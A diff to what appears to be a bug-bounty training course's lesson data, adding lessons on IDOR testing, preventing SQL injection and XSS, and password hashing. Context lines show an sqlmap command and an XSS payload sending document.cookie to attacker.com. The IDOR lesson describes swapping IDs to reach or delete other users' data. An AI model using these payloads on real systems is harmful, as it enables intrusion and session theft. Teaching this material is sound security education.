@@ -250,6 +250,48 @@ If I change \`1001\` to \`1002\` and see someone else's data, that's an IDOR.
 - Test both GET and POST parameters
 - Look for base64-encoded IDs
                         `
+                    },
+                    {
+                        id: 'idor-exploitation',
+                        title: 'Exploiting IDOR Bugs',
+                        type: 'text',
+                        duration: '20m',
+                        xp: 100,
+                        content: `
+# Testing Access Control
+
+Finding an ID parameter is just step one. Now you must prove the vulnerability.
+
+## The Testing Methodology
+
+1. **Create Accounts**: You need at least two accounts (Attacker and Victim) and ideally an Admin account.
+2. **Map the Application**: Find every request that uses an ID.
+3. **Swap IDs**: Replace the Attacker's ID with the Victim's ID.
+
+## Types of IDOR
+
+### GET-Based IDOR
+The simplest form.
+\`GET /api/messages?user_id=123\`
+Change 123 to 124.
+
+### POST-Based IDOR
+Often hidden in JSON bodies.
+\`\`\`json
+{
+  "user_id": 123,
+  "email": "hacker@test.com"
+}
+\`\`\`
+
+### Blind IDOR
+The application doesn't return data, but performs an action (delete, update).
+\`POST /api/delete_photo?id=500\`
+If you delete someone else's photo, it's a valid P1 bug!
+
+> [!WARNING]
+> Only test with accounts you own. Deleting user data in production is illegal and dangerous.
+                        `
                     }
                 ]
             },
@@ -422,6 +464,45 @@ sqlmap -u "http://target.com/page?id=1" --dbs
 
 > [!TIP]
 > Master manual SQLi before relying on automated tools. Bug bounty platforms often reject SQLMap-only reports.
+                        `
+                    },
+                    {
+                        id: 'sqli-prevention',
+                        title: 'Preventing SQL Injection',
+                        type: 'text',
+                        duration: '15m',
+                        xp: 100,
+                        content: `
+# Defending Against SQL Injection
+
+Understanding how to fix vulnerabilities is just as important as finding them.
+
+## 1. Parameterized Queries (Prepared Statements)
+The #1 defense against SQLi. Instead of concatenating input, you define structure first.
+
+**Vulnerable PHP:**
+\`\`\`php
+$sql = "SELECT * FROM users WHERE id = " . $id;
+\`\`\`
+
+**Secure PHP (PDO):**
+\`\`\`php
+$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
+$stmt->execute(['id' => $id]);
+\`\`\`
+
+## 2. Input Validation (Allow-listing)
+Only accept expected values.
+- If ID should be a number, ensure it is an integer.
+- If sort_by can only be 'name' or 'date', check against that list.
+
+## 3. Least Privilege
+The database user for the web app should not be 'root' or 'sa'.
+- Only grant SELECT/INSERT/UPDATE/DELETE.
+- Remove permissions for DROP TABLE or FILE access.
+
+## 4. Modern ORMs
+Using an ORM like Sequelize (Node), Entity Framework (C#), or Eloquent (Laravel) handles escaping automatically in most cases.
                         `
                     }
                 ]
@@ -617,6 +698,40 @@ new Image().src = 'https://attacker.com/?c=' + document.cookie;
 > [!TIP]
 > Many high-paying XSS bugs are found in obscure parameters like error callbacks or debug modes.
                         `
+                    },
+                    {
+                        id: 'xss-prevention',
+                        title: 'XSS Prevention Guide',
+                        type: 'text',
+                        duration: '15m',
+                        xp: 100,
+                        content: `
+# Preventing Cross-Site Scripting (XSS)
+
+Stop attackers from executing malicious scripts in your application.
+
+## 1. Output Encoding (Context-Aware)
+The golden rule: Treat all user input as untrusted. Convert special characters into safe HTML entities before displaying them.
+
+- **In HTML Body:** Convert \`< > & " '\` to \`&lt; &gt; &amp; &quot; &#x27;\`
+- **In Attributes:** Attribute encode values.
+- **In JavaScript:** Unicode escape.
+
+**Frameworks help you:**
+React, Angular, and Vue do this automatically in their default data binding (e.g., \`{variable}\`). 
+**Danger:** Avoid \`dangerouslySetInnerHTML\` (React) or \`v-html\` (Vue).
+
+## 2. Content Security Policy (CSP)
+A browser mechanism to whitelist trusted sources of executable scripts.
+
+**Example Header:**
+\`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;\`
+
+This prevents the browser from executing inline scripts (\`<script>...\</script>\`) and scripts from unauthorized domains.
+
+## 3. HttpOnly Cookies
+Mark session cookies as \`HttpOnly\`. This prevents client-side JavaScript (like an XSS payload) from reading the cookie, mitigating cookie theft.
+                        `
                     }
                 ]
             },
@@ -738,6 +853,51 @@ The /api/orders endpoint uses sequential order IDs without authorization checks.
 
 **Recommendation:**
 Implement authorization checks to verify the requesting user owns the resource.
+                        `
+                    }
+                ]
+            },
+            {
+                id: 'm8',
+                title: 'Authentication Basics',
+                duration: '45m',
+                lessons: [
+                    {
+                        id: 'auth-basics',
+                        title: 'Secure Password Storage',
+                        type: 'text',
+                        duration: '20m',
+                        xp: 100,
+                        content: `
+# Authentication & Password Storage
+
+Authentication is the lock on the front door. If it's weak, nothing else matters.
+
+## Storing Passwords Securely
+
+**NEVER** store passwords in plain text.
+**NEVER** use reversible encryption (AES, DES).
+**NEVER** use weak hashing (MD5, SHA1) without salt.
+
+### The Right Way: Salting & Hashing
+1. **Salt**: A random string added to the password before hashing. Prevents Rainbow Table attacks.
+2. **Hash**: A one-way mathematical function.
+3. **Slow Algorithm**: Use algorithms designed to be slow (bcrypt, PBKDF2, Argon2, scrypt) to resist Brute Force.
+
+**Python Example:**
+\`\`\`python
+import bcrypt
+
+salt = bcrypt.gensalt()
+hashed = bcrypt.hashpw(password.encode(), salt)
+\`\`\`
+
+## Authentication Vulnerabilities to Hunt
+
+1. **Weak Password Policy**: Allowing "123456".
+2. **No Rate Limiting**: Allowing unlimited login attempts (Brute Force).
+3. **Username Enumeration**: "User not found" vs "Wrong password".
+4. **Session Management**: Tokens not expiring on logout.
                         `
                     }
                 ]
